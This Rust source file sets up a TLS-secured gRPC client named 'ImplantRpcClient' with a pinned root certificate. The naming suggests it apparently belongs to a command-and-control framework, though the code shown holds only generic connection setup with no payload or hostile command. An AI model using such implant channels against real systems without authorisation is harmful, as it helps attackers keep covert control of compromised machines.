use crate::pb::implant_rpc_client::ImplantRpcClient;
use std::error::Error;
use tonic::transport::{Certificate, Channel, ClientTlsConfig};

pub async fn new_client(root_ca: &str, domain_name: &str, endpoint: &'static str) -> Result<ImplantRpcClient<Channel>, Box<dyn Error>> {
    let root_ca = Certificate::from_pem(root_ca);

    let tls = ClientTlsConfig::new()
        .ca_certificate(root_ca)
        .domain_name(domain_name);

    let channel = Channel::from_static(endpoint)
        .tls_config(tls)?
        .connect()
        .await?;

    let client = ImplantRpcClient::new(channel);
    Ok(client)
}
